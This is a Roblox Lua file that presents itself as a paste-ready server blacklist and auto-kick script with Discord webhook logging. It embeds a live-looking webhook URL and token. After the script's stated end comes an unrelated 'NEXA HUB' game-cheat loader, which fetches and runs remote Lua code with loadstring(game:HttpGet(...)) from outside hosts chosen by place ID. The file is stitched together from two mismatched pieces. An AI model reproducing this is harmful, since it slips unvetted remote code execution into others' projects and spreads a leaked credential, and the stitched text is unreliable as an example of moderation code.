-- ServerScriptService > Script
-- Blacklist + Auto-Kick + Anti-Kick detection + Discord webhook logging
-- Paste-ready single script

local Players = game:GetService("Players")
local DataStoreService = game:GetService("DataStoreService")
local HttpService = game:GetService("HttpService")
local ds = DataStoreService:GetDataStore("GlobalBlacklist_v2")

-- Masukkan webhook Discord Anda di sini (user-provided)
local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1421821032347471964/HjUixepyE6PMgz80uwdkCSVJMHvAgLtzM_r00XgqgyZwKqSEe7pSqQNDGzkWgPP17k_H"

-- Hardcoded initial entries (masukkan userid yang Anda sebutkan)
local HARDCODED = {
    [1924645350] = true, -- @cosmofsv
}

-- Local cache (key = tostring(userid)) untuk performance & fallback
local BLACKLIST = {}

-- Save cooldown (agar tidak spam DataStore)
local lastSave = 0
local SAVE_COOLDOWN = 3 -- detik minimal antar save

-- Helper: kirim message ke Discord webhook (simple content)
local function sendDiscord(content)
    if not DISCORD_WEBHOOK or DISCORD_WEBHOOK == "" then return end
    local payload = {
        content = tostring(content)
    }
    local ok, err = pcall(function()
        -- Roblox HttpService.PostAsync expects a string; gunakan JSON
        local body = HttpService:JSONEncode(payload)
        HttpService:PostAsync(DISCORD_WEBHOOK, body, Enum.HttpContentType.ApplicationJson)
    end)
    if not ok then
        warn("[DiscordWebhook] Gagal kirim:", err)
    end
end

-- Util: safe save ke DataStore
local function saveBlacklist()
    local now = tick()
    if now - lastSave < SAVE_COOLDOWN then return end
    lastSave = now
    local ok, err = pcall(function()
        ds:SetAsync("blacklist", BLACKLIST)
    end)
    if not ok then
        warn("[Blacklist] Gagal menyimpan ke DataStore:", err)
    end
end

-- Util: safe load dari DataStore
local function loadBlacklist()
    local ok, data = pcall(function()
        return ds:GetAsync("blacklist")
    end)
    if ok and type(data) == "table" then
        BLACKLIST = data
    else
        -- inisialisasi jika DataStore kosong/gagal
        BLACKLIST = {}
        for id, v in pairs(HARDCODED) do
            BLACKLIST[tostring(id)] = true
        end
        -- coba simpan inisialisasi (pcall)
        pcall(function() ds:SetAsync("blacklist", BLACKLIST) end)
        if not ok then
            warn("[Blacklist] GetAsync gagal; menggunakan cache awal + hardcoded.")
        end
    end
    -- pastikan hardcoded entries ada
    for id, v in pairs(HARDCODED) do
        BLACKLIST[tostring(id)] = true
    end
    -- kirim log awal ke webhook (opsional)
    sendDiscord(string.format("Blacklist loaded. Entries: %d (includes hardcoded)", (function() local c=0; for _ in pairs(BLACKLIST) do c=c+1 end; return c end)()))
end

-- Tambah/remove helper
local function addToBlacklist(userid, reason)
    BLACKLIST[tostring(userid)] = true
    saveBlacklist()
    local msg = ("[Blacklist] Added: %s. Reason: %s"):format(tostring(userid), tostring(reason or "manual"))
    print(msg)
    sendDiscord(msg)
end

local function removeFromBlacklist(userid)
    BLACKLIST[tostring(userid)] = nil
    saveBlacklist()
    local msg = ("[Blacklist] Removed: %s"):format(tostring(userid))
    print(msg)
    sendDiscord(msg)
end

local function isBlacklistedUserId(userid)
    return BLACKLIST[tostring(userid)] == true
end

local function logEvent(msg)
    print("[BlacklistLog] "..tostring(msg))
    sendDiscord("[ServerLog] "..tostring(msg))
end

-- Coba kick lalu cek apakah berhasil. Jika gagal (pemain masih ada),
-- akan dianggap "anti-kick" dan otomatis ditambahkan ke blacklist.
local function attemptKickAndDetect(player, reason)
    reason = reason or "Anda diblacklist dari server."
    local userIdStr = tostring(player.UserId)

    -- attempt kick safely
    local ok, err = pcall(function()
        player:Kick(reason)
    end)
    if not ok then
        warn("[Kick] pcall error for", player.Name, err)
    end

    -- tunggu singkat lalu cek apakah player masih ada
    task.delay(2, function()
        -- jika Player dengan same UserId masih di game => kemungkinan anti-kick
        for _, p in pairs(Players:GetPlayers()) do
            if tostring(p.UserId) == userIdStr then
                -- Deteksi anti-kick: tambahkan permanen ke blacklist
                local info = ("Detected anti-kick for %s (%s) — auto-banning"):format(p.Name, p.UserId)
                logEvent(info)
                addToBlacklist(p.UserId, "detected anti-kick")

                -- attempt kick lagi after banning
                local ok2, err2 = pcall(function() p:Kick("Anda diblacklist (detected anti-kick).") end)
                if not ok2 then
                    warn("[Kick] Second attempt failed for", p.Name, err2)
                end

                -- additional mitigation: try to remove character/tools to limit disruption
                pcall(function()
                    if p.Character then
                        for _, child in pairs(p.Character:GetDescendants()) do
                            if child:IsA("Tool") then child:Destroy() end
                        end
                        local hum = p.Character:FindFirstChildOfClass("Humanoid")
                        if hum then
                            hum.BreakJointsOnDeath = true
                            hum.Health = 0
                        end
                    end
                end)

                return
            end
        end
    end)
end

-- Handler on player join: kick immediately jika blacklist
local function handlePlayerJoin(player)
    if isBlacklistedUserId(player.UserId) then
        local info = ("Kicking blacklisted player %s (%s)"):format(player.Name, player.UserId)
        logEvent(info)
        attemptKickAndDetect(player, "Anda diblacklist dari server.")
    end
end

-- Init load & initial kick for currently online players
loadBlacklist()
for _, p in pairs(Players:GetPlayers()) do
    handlePlayerJoin(p)
end
Players.PlayerAdded:Connect(handlePlayerJoin)

-- Extra: periodic sweep to enforce blacklist (in case a blacklisted player somehow stays)
task.spawn(function()
    while true do
        for _, p in pairs(Players:GetPlayers()) do
            if isBlacklistedUserId(p.UserId) then
                attemptKickAndDetect(p, "Anda diblacklist dari server. (enforced)")
            end
        end
        task.wait(10) -- interval sweep (10s)
    end
end)

-- Utility: Expose functions to Command Bar / Server Console if Anda mau:
-- addToBlacklist(1924645350)    -- tambahkan userid
-- removeFromBlacklist(1924645350) -- hapus userid

-- End of script

local placeId = game.PlaceId
local StarterGui = game:GetService("StarterGui")
local gameName, success = nil, false

if placeId == 121864768012064 then
    gameName = "Fish It"
    loadstring(game:HttpGet("https://pandadevelopment.net/virtual/file/f196a0a2c3db9e4c"))()
    success = true
elseif placeId == 127742093697776 then
    gameName = "Plant Vs Brainrots"
    loadstring(game:HttpGet("https://pandadevelopment.net/virtual/file/026e7028c3afabd0"))()
    success = true
elseif placeId == 18687417158 then
    gameName = "Forsaken"
    loadstring(game:HttpGet("https://pandadevelopment.net/virtual/file/f196a0a2c3db9e4c"))()
    success = true
elseif placeId == 121864768012064 then
    gameName = "Fish It"
    loadstring(game:HttpGet("https://pandadevelopment.net/virtual/file/f196a0a2c3db9e4c"))()
    success = true
elseif placeId == 131716211654599 then
    gameName = "Fisch 🐟"
    loadstring(game:HttpGet("https://pandadevelopment.net/virtual/file/18468d6a99cee147"))()
    success = true
elseif placeId == 109983668079237 then
    gameName = "Steal A Brainrot"
    loadstring(game:HttpGet("https://raw.githubusercontent.com/username/game-6/main.lua"))()
    success = true
elseif placeId == 3456789012 then
    gameName = "Game 7"
    loadstring(game:HttpGet("https://raw.githubusercontent.com/username/game-7/main.lua"))()
    success = true
elseif placeId == 4567890123 then
    gameName = "Game 8"
    loadstring(game:HttpGet("https://raw.githubusercontent.com/username/game-8/main.lua"))()
    success = true
elseif placeId == 5678901234 then
    gameName = "Game 9"
    loadstring(game:HttpGet("https://raw.githubusercontent.com/username/game-9/main.lua"))()
    success = true
elseif placeId == 6789012345 then
    gameName = "Game 10"
    loadstring(game:HttpGet("https://raw.githubusercontent.com/username/game-10/main.lua"))()
    success = true
end

if success and gameName then
    StarterGui:SetCore("SendNotification", {
        Title = "NEXA HUB Loaded!",
        Text = gameName .. " script loader!",
        Duration = 6,
        Icon = "rbxassetid://6023426926"
    })
else
    StarterGui:SetCore("SendNotification", {
        Title = "NEXA HUB",
        Text = (gameName or "Game") .. " Not Found!",
        Duration = 6,
        Icon = "rbxassetid://6023426923"
    })
end 
